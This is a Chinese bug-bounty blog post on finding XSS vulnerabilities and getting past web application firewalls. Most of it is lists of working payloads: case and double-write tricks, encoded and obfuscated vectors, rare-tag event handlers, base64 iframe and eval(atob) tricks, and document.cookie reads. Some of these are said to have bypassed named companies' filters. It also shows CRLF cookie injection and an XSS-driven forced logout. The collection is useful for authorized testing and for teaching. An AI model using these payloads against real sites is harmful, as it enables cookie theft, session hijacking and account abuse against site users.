    <entry>
      <title>2.XSS的挖掘</title>
      <link href="/2026/07/24/XSS%E7%9A%84%E6%8C%96%E6%8E%98/"/>
      <url>/2026/07/24/XSS%E7%9A%84%E6%8C%96%E6%8E%98/</url>
      
        <content type="html"><![CDATA[<h1 id="2-XSS的挖掘"><a href="#2-XSS的挖掘" class="headerlink" title="2.XSS的挖掘"></a>2.XSS的挖掘</h1><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>学习web漏洞，最常见的就是xss漏洞，可以说，见到框就插。在公益src，Edusrc，随便插入，一个<code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 直接弹框，能发现不少xss，但是去挖企业src，直接就碰壁了，一个简单的<code>&lt;script&gt;</code>标签就直接给拦截了，发现一个标签就打不动，waf使劲拦截，搞到最后连是否存在xss漏洞都不知道。</p><p><mark>XSS挖的技巧就是，遇到框就插入！能输入的都可以测试XSS!</mark></p><h2 id="二、重点：不要再直接打弹框payload"><a href="#二、重点：不要再直接打弹框payload" class="headerlink" title="二、重点：不要再直接打弹框payload"></a>二、重点：不要再直接打弹框payload</h2><h3 id="我的理解"><a href="#我的理解" class="headerlink" title="我的理解"></a>我的理解</h3><p>这是我觉得挖企业SRC的XSS最重要的一点。之前在edusrc挖的时候，上来就是<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，弹框就完事了。但到了企业SRC，这种攻击型payload根本打不进去。</p><h3 id="误区"><a href="#误区" class="headerlink" title="误区"></a>误区</h3><p>测试XSS直接用：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure><p>会遇到三个大麻烦：</p><p>(1) waf直接给拦截了，payload根本打不进去。</p><p>(2) 对方后端就过滤死了不让你使用<code>&lt;script&gt;</code>这种明显的标签。</p><p>(3) 对方压根就不允许弹框。</p><p>上来三个大山压着，你直接打个攻击payload就没法确定它到底存不存在xss。你打个<code>&lt;script&gt;</code>不弹框后就走了，觉得没有xss，但万一它实际上有xss呢？只是你的标签被阻断了！</p><h3 id="正确思路：先用无害标签探测"><a href="#正确思路：先用无害标签探测" class="headerlink" title="正确思路：先用无害标签探测"></a>正确思路：先用无害标签探测</h3><p>XSS的本质原理就是解析了用户插入的标签。既然是解析标签，为什么不能插入没有攻击危害的标签先探测呢？如果解析标签成功，确认存在XSS，再一步步绕过那”三个大麻烦”就行了。</p><p>下面是无危害探测标签，基本不会触发任何WAF：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">s</span>&gt;</span>123</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>123<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>123<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>123<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>#</span><br><span class="line"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">s</span>&gt;</span>123#//--+</span><br><span class="line">&#x27;&quot;&gt;<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">s</span>&gt;</span>123#//--+</span><br></pre></td></tr></table></figure><p>比如<code>&lt;s&gt;</code>就是画横线，要是画横线成功，就证明标签解析成功，存在xss，后面就需要你去绕过再弹框。</p><h3 id="XSS的检测原理"><a href="#XSS的检测原理" class="headerlink" title="XSS的检测原理"></a>XSS的检测原理</h3><p>插入标签后，返回包成功完整返回标签，这就是XSS的检测原理。总结来说，就是看返回包。</p><h3 id="怎么从返回包判定绕过成功"><a href="#怎么从返回包判定绕过成功" class="headerlink" title="怎么从返回包判定绕过成功"></a>怎么从返回包判定绕过成功</h3><p>主要看返回包的标签颜色。如果解析XSS标签成功，这个标签会有彩色的颜色，就能基于这个特征不断进行FUZZ测试，从而绕过WAF。</p><p>失败的XSS：无论有没有被实体化编码，如果你输入的xss标签整个都变成了灰色，就是无法解析该标签，就是失败的。</p><h2 id="三、XSS绕过手段总结"><a href="#三、XSS绕过手段总结" class="headerlink" title="三、XSS绕过手段总结"></a>三、XSS绕过手段总结</h2><h3 id="1-基础绕过"><a href="#1-基础绕过" class="headerlink" title="1. 基础绕过"></a>1. 基础绕过</h3><p><strong>大小写绕过：</strong></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Script</span>&gt;</span>alert(1);<span class="tag">&lt;/<span class="name">Script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>双写绕过：</strong></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;script<span class="tag">&lt;<span class="name">script</span>&gt;</span>&gt;alert(1);&lt;/sc<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&gt;</span><br></pre></td></tr></table></figure><p><strong>禁用alert时绕过：</strong></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;1&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;confirm(&#x27;xss&#x27;)&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>confirm(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>prompt(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>禁用单引号时：</strong>（数字可以不带引号）</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">confirm</span>(<span class="string">`xss`</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">confirm</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>过滤括号()时：</strong>（使用反单引号代替）</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">alert<span class="string">`1`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>过滤尖括号&lt;&gt;时：</strong>（通过伪协议绕过）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload=hello&#x27; onmouseover=&#x27;javascript:alert(1)&#x27;</span><br></pre></td></tr></table></figure><p><strong>空格的替换：</strong> 空格url编码为<code>%20</code>，可替换成<code>%09</code> <code>%0a</code> <code>%0b</code> <code>%0c</code> <code>%0d</code> <code>%a0</code> <code>/</code></p><p><strong>单引号的替换：</strong> 把<code>&#39;</code>改成反引号<code>`</code></p><h3 id="2-编码绕过"><a href="#2-编码绕过" class="headerlink" title="2. 编码绕过"></a>2. 编码绕过</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;svg%20onload=confir\u006d`1`&gt;</span><br></pre></td></tr></table></figure><h3 id="3-混淆绕过"><a href="#3-混淆绕过" class="headerlink" title="3. 混淆绕过"></a>3. 混淆绕过</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span>&#x27;&quot;&lt;a/href=&quot;ja%26Tab;vas%26Tab;cript%26Tab;%26Tab;%26Tab;:%26Tab;%26Tab;top%26Tab;[8680439..toString(30)]()&quot;&gt;click_me<span class="tag">&lt;/<span class="name">a</span>&gt;</span>#</span><br></pre></td></tr></table></figure><p>这个标签在众测中大杀四方。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;media-wrap image-wrap&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://xxx.png&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert`1`&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>也是在众测中过了WAF的标签。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;script%20type=&quot;text/javascript&quot;&gt;%20var%20reg%20=%20/test/;%20var%20str%20=%20%27testString%27;%20var%20result%20=%20reg.exec(str);%20alert(result);%20<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这个bypass过百度、阿里巴巴。</p><h3 id="4-编码加密绕过"><a href="#4-编码加密绕过" class="headerlink" title="4. 编码加密绕过"></a>4. 编码加密绕过</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PFNDcmlwdD5hbGVydCgxKTwvU0NyaXB0Pg==&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="5-冷门标签绕过（很适合绕过WAF）"><a href="#5-冷门标签绕过（很适合绕过WAF）" class="headerlink" title="5. 冷门标签绕过（很适合绕过WAF）"></a>5. 冷门标签绕过（很适合绕过WAF）</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sTylE</span> <span class="attr">OnLoAd</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;dETAILS%0Aopen%0AonToGgle%0A=%0Aa=prompt,a()%20x&gt;</span><br><span class="line"></span><br><span class="line">&lt;dETAILS%0Aopen%0AonToGgle%0A=%0Aa=confirm,a()%20x&gt;</span><br></pre></td></tr></table></figure><p>过携程和oppo：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">22onmouseover=%22a=confirm,a(document.cookie)%22--+//%23</span><br><span class="line"></span><br><span class="line">&lt;dETAILS%0Aopen%0AonToGgle%0A=%0Aa=confirm,a(document.cookie)%20x&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg%20onmouseover%0A=%0Aa=confirm,a(1)&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg%0Aonmouseover%0A=%0Aa=confirm,a(1)%20x&gt;</span><br></pre></td></tr></table></figure><p>更多冷门payload：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#x27;+onclick=a=alert,a(1)--+</span><br><span class="line">&#x27;+onclick=a=confirm,a(1)--+</span><br><span class="line">%27+onclick=&#x27;a=alert,a(1)&#x27;--+</span><br></pre></td></tr></table></figure><p>注释的时候使用<code>--+</code>和<code>//</code>，经测试<code>%23</code>无效。如果onload不能用就换成其他属性。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">marquee</span> <span class="attr">behavior</span>=<span class="string">&quot;alternate&quot;</span> <span class="attr">onstart</span>=<span class="string">alert(1)</span>&gt;</span>123<span class="tag">&lt;/<span class="name">marquee</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onpageshow</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">details</span> <span class="attr">ontoggle</span>=<span class="string">alert()</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SVg</span> &lt;/<span class="attr">onLoaD</span> =<span class="string">&quot;1&gt; (_=prompt,_(1)) &quot;</span>&quot;&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>(<span class="title function_">atob</span>(<span class="string">&#x27;YWxlcnQoZG9jdW1lbnQuY29va2llKTs=&#x27;</span>));</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">\u0061\u006c\u0065\u0072\u0074(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">javascript:alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">setInterval</span>`<span class="attr">alert</span>\<span class="attr">x28document.domain</span>\<span class="attr">x29</span>`&gt;</span></span><br></pre></td></tr></table></figure><p>需要点击的：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;d3&quot;&lt;&quot;/onclick=&quot;1&gt;[confirm``]&quot;&lt;&quot;&gt;dianwo</span><br><span class="line">&lt;w=&quot;/x=&quot;y&gt;&quot;/oNCliCk=`&lt;`[confir\u006d``]&gt;dianwo</span><br></pre></td></tr></table></figure><p>需要双击的：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;w=&quot;/x=&quot;y&gt;&quot;/ondblclick=`&lt;`[confir\u006d``]&gt;dianwo2</span><br></pre></td></tr></table></figure><h2 id="四、文件上传XSS"><a href="#四、文件上传XSS" class="headerlink" title="四、文件上传XSS"></a>四、文件上传XSS</h2><h3 id="PDF-XSS"><a href="#PDF-XSS" class="headerlink" title="PDF-XSS"></a>PDF-XSS</h3><p>众测收取，中危漏洞。SRC不收取pdf xss。</p><h3 id="HTML-XSS"><a href="#HTML-XSS" class="headerlink" title="HTML-XSS"></a>HTML-XSS</h3><p>众测和SRC均收取，中危漏洞。上传一个包含xss payload的html文件即可。</p><h3 id="SVG-XSS"><a href="#SVG-XSS" class="headerlink" title="SVG-XSS"></a>SVG-XSS</h3><p>和html-xss几乎一模一样，只是后缀不同，一个是<code>.html</code>，一个是<code>.svg</code>。主要用于绕过禁止上传html的场景。</p><h2 id="五、特殊XSS技巧"><a href="#五、特殊XSS技巧" class="headerlink" title="五、特殊XSS技巧"></a>五、特殊XSS技巧</h2><h3 id="swagger-XSS"><a href="#swagger-XSS" class="headerlink" title="swagger-XSS"></a>swagger-XSS</h3><p>通过<code>?configUrl=https://xss.smarpo.com/test.json</code>的方式触发漏洞。</p><h3 id="JSONP导致的XSS"><a href="#JSONP导致的XSS" class="headerlink" title="JSONP导致的XSS"></a>JSONP导致的XSS</h3><p>jsonp接口如果没做好过滤，callback参数可以注入xss。</p><h3 id="CRLF注入导致的XSS"><a href="#CRLF注入导致的XSS" class="headerlink" title="CRLF注入导致的XSS"></a>CRLF注入导致的XSS</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/%0a%0dSet-Cookie:%20id=admin</span><br><span class="line">%0a%0d%0a%0d%0a&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="编辑器链接处XSS"><a href="#编辑器链接处XSS" class="headerlink" title="编辑器链接处XSS"></a>编辑器链接处XSS</h3><p>在富文本编辑器的链接输入框中插入xss payload。</p><h3 id="XSS和CSRF组合利用"><a href="#XSS和CSRF组合利用" class="headerlink" title="XSS和CSRF组合利用"></a>XSS和CSRF组合利用</h3><p>在评论区或头像名称插入xss，src指向退出接口，只要有人触发xss就会强制退出账号，算xss的高危利用。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#x27;&quot;&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://xxxxx:8081/c/portal/logout</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span>#</span><br></pre></td></tr></table></figure><h3 id="编码XSS实战"><a href="#编码XSS实战" class="headerlink" title="编码XSS实战"></a>编码XSS实战</h3><p>对url后面的字符串进行base64解码，发现是打印在页面上的邮箱，然后进行xss弹窗测试：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;email&quot;</span><span class="punctuation">:</span><span class="string">&quot;l***@&lt;img src=1 onerror=alert(1)&gt;163.com&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>编码后：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJlbWFpbCI6ImwqKipAPGltZyBzcmM9MSBvbmVycm9yPWFsZXJ0KDEpPjE2My5jb20ifQ==</span><br></pre></td></tr></table></figure><h2 id="六、实战案例备忘"><a href="#六、实战案例备忘" class="headerlink" title="六、实战案例备忘"></a>六、实战案例备忘</h2><table><thead><tr><th>场景</th><th>类型</th><th>备注</th></tr></thead><tbody><tr><td>商城XSS</td><td>存储型</td><td>输入框插入payload</td></tr><tr><td>文件上传XSS</td><td>上传型</td><td>上传含xss的html&#x2F;svg</td></tr><tr><td>留言板XSS</td><td>存储型</td><td>评论内容插入payload</td></tr><tr><td>门户Jsonp-XSS</td><td>反射型</td><td>callback参数注入</td></tr><tr><td>SSO登录Jsonp-XSS</td><td>反射型</td><td>登录接口参数注入</td></tr><tr><td>直播间XSS</td><td>存储型</td><td>昵称插入，与主播互动触发</td></tr><tr><td>众测存储XSS</td><td>存储型</td><td>通用存储型</td></tr></tbody></table>]]></content>
      
      
